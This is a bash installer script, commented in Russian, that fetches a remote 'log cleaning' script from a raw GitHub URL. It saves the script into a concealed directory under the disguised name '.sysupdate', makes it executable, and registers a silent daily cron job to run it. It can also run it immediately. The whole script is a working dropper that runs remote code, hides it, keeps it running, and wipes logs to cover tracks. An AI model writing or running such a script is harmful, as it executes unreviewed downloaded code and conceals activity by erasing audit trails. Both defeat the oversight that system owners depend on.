#!/bin/bash

# Скрытая установка скрипта очистки логов

# Определяем скрытую директорию
HIDDEN_DIR="$HOME/.cache/system"
SCRIPT_NAME=".sysupdate"
SCRIPT_PATH="$HIDDEN_DIR/$SCRIPT_NAME"
SCRIPT_URL="https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh"

# Создаем скрытую директорию если её нет
mkdir -p "$HIDDEN_DIR" 2>/dev/null

# Скачиваем скрипт
if command -v curl &> /dev/null; then
    curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH"
elif command -v wget &> /dev/null; then
    wget -qO "$SCRIPT_PATH" "$SCRIPT_URL"
else
    echo "Error: curl or wget required"
    exit 1
fi

# Даем права на выполнение
chmod +x "$SCRIPT_PATH"

echo "Installed successfully"
echo "Location: $SCRIPT_PATH"

# Проверяем наличие crontab
if command -v crontab &> /dev/null; then
    # Проверяем, не добавлен ли уже скрипт в crontab
    if crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        echo "Already in crontab"
    else
        # Добавляем в crontab (каждый день в 00:00)
        (crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash $SCRIPT_PATH >/dev/null 2>&1") | crontab -
        echo "Schedule: Daily at 00:00"
    fi
else
    echo "Warning: crontab not found. Install cron to enable automatic scheduling."
    echo "To install: apt-get install cron (Debian/Ubuntu) or yum install cronie (CentOS/RHEL)"
fi

# Запускаем сразу (опционально)
echo ""
read -p "Run now? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    bash "$SCRIPT_PATH"
    echo "Done"
fi
